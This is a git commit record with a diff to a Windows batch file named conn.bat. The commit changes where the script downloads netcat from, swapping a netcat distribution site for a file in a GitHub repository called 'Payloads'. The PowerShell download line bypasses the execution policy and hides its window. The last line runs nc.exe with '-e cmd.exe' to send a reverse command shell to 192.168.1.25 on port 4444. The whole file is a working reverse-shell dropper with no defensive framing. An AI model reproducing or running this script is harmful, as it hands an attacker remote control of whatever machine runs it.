c171d23db655a52ac70229d0fd8ea25f15df6306
Vimarkov <42305465+Vimarkov@users.noreply.github.com>
2021-07-12 14:32:37 +0200

    Update conn.bat

--- conn.bat
+++ conn.bat
@@ -1,3 +1,3 @@
-powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip','C:\Temp\nc.exe');"
+powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/Vimarkov/Payloads/blob/main/nc.exe?raw=true','C:\Temp\nc.exe');"
 
 C:\Temp\nc.exe -e cmd.exe 192.168.1.25 4444
